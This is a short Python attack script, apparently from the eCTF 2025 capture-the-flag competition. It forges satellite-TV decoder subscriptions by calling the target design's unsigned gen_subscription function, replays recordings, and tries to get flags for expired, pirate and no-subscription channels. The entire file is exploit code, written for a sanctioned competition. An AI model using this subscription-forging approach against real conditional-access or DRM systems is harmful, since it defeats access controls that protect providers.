#!/usr/bin/env python3
# forge subscription if the encoder's gen_subscription function doesn't perform any encryption/signing
import asyncio
import itertools
import json
import os
import re
import sys

from ectf25.tv import TV
from ectf25_design.gen_subscription import gen_subscription
from loguru import logger

from attack_utils import (
    LimitedAttackTV,
    conn,
    get_decoder_id,
    recording_playback,
    run_attack,
)


async def main():
    decoder_id = get_decoder_id()

    r = conn()

    subscriptions = [
        gen_subscription(b"{}", decoder_id, 0, 2**63 - 1, i) for i in range(1, 5)
    ]

    for subscription in subscriptions:
        r.subscribe(subscription)

    flag = await recording_playback()
    if flag:
        print(f"POTENTIAL FLAG: ectf{{recording_{flag}}}")

    for channel, scenario in [(2, "expired"), (3, "pirate"), (4, "nosub")]:
        tv = LimitedAttackTV(
            os.environ["IP"],
            int(os.environ[f"CHANNEL_{channel}_PORT"]),
            "/dev/ttyACM0",
            115200,
        )

        tv.run()

        if tv.flag:
            print(f"POTENTIAL FLAG: ectf{{{scenario}_{tv.flag}}}")


if __name__ == "__main__":
    run_attack(main, 30)
